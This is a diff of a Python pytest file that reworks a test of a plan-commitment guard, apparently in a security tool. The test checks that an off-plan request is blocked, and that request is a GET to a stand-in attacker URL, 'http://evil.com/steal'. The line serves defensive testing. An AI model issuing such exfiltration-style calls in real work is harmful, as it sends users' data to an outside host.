@@ -8,7 +8,7 @@ import pytest
 
 from tainted.dynamic.target import Account, ProveSetup, SeedRecord, Target
 from tainted.selfdefense import PlanViolation
-from tainted_mcp.guard import guarded_replay
+from tainted.execution.guard import build_probe_plan, commit_plan, guarded_replay, new_run_key
 from tainted_mcp.server import server
 
 
@@ -34,7 +34,9 @@ def _setup():
 
 
 def test_plan_commitment_blocks_off_plan_request():
-    replay, guard = guarded_replay(_setup())
+    key = new_run_key()
+    plan = build_probe_plan(_setup())
+    replay, guard = guarded_replay(_setup(), plan, commit_plan(plan, key), key)
     with pytest.raises(PlanViolation):
         replay._client.get("http://evil.com/steal")
     assert guard.blocked_calls
